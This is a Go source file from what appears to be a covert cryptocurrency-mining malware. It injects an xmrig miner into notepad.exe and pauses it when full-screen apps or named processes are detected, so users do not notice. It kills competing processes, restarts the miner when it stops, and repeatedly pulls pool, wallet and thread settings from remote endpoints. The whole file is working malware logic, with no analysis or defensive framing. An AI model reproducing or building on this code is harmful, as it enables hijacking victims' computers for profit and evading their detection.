//go:build !panel

// core.go

package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

func getDomain() string {
	fmt.Println("sending GET request")

	endpointList := strings.Split(endpoints, ",")
	fmt.Println(endpointList)
	// Create an HTTP client with a timeout to avoid hanging
	client := &http.Client{
		Timeout: 5 * time.Second, // Adjust timeout as needed
	}
	var livedomain = ""

	// Iterate through the list of domains
	for _, domain := range endpointList {

		// Try to make a GET request to the domain
		resp, err := client.Get(domain)
		if err != nil {
			fmt.Printf("Domain %s is unreachable: %v\n", domain, err)
			continue // Move to the next domain if this one is unreachable
		}
		defer resp.Body.Close() // Ensure the response body is closed

		// Check if the status code is 2xx (successful)
		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			fmt.Printf("Domain %s is reachable\n", domain)
			livedomain = domain
			return livedomain // Return the first reachable domain
		}

		fmt.Printf("Domain %s returned status code: %d\n", domain, resp.StatusCode)
	}

	// If no domain is reachable, return an empty string
	return livedomain
}

func runChecks() {

	minerinfo := Inject("C:\\Windows\\System32\\notepad.exe", xmrig, craftCLI(false))
	time.Sleep(7 * time.Second)
	fmt.Printf("Miner PID: %d\n", minerinfo.ProcessId)
	for {
		killMalware(enablekiller, minerinfo.ProcessId)
		if isForegroundFullScreen() {
			SuspendProcess(minerinfo.Process)
			time.Sleep(10 * time.Second)

		} else {
			ResumeProcess(minerinfo.Process)
		}
		if checkProcessesForMatch(processNames) {
			SuspendProcess(minerinfo.Process)
			time.Sleep(10 * time.Second)

		} else {
			ResumeProcess(minerinfo.Process)
		}

		running := isProcessRunning(int(minerinfo.ProcessId))
		if !running {
			if checkIdle() {
				fmt.Printf("Alert: Process with PID %d is NOT running!\n", minerinfo.ProcessId)
				pi := Inject("C:\\Windows\\System32\\notepad.exe", xmrig, craftCLI(true))
				minerinfo = pi
			} else {
				fmt.Printf("Alert: Process with PID %d is NOT running!\n", minerinfo.ProcessId)
				pi := Inject("C:\\Windows\\System32\\notepad.exe", xmrig, craftCLI(false))
				minerinfo = pi
			}

		} else {
			fmt.Println("Miner running :)")
		}

		time.Sleep(15 * time.Second)
	}
}

func getConfig() {
	for {

		var data []Res
		//success := false
		endpoint := getDomain()
		fmt.Println("hello?")

		resp, err := http.Get(endpoint)
		if err != nil {
			fmt.Println("Request failed:", err)
			continue
		}
		defer resp.Body.Close()

		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Failed to read response:", err)
			continue
		}

		fmt.Println(string(bodyBytes))

		if err := json.Unmarshal(bodyBytes, &data); err != nil {
			fmt.Println("Failed to parse JSON:", err)
			continue
		}

		// if len(data) > 0 {
		// 	success = true
		// 	break
		// }

		// if !success {
		// 	fmt.Println("All endpoints failed, retrying in 10 seconds...")
		// 	time.Sleep(10 * time.Second)
		// 	continue
		// }

		fmt.Println("working?")
		fmt.Println(data)

		miningpool = data[0].Pool
		mining_wallet = data[0].Address
		mining_password = data[0].Password
		threads = data[0].Threads
		idle_time = data[0].IdleTime
		idlethreads = data[0].IdleThreads
		ssl = data[0].Ssl

		time.Sleep(25 * time.Second)
	}
}
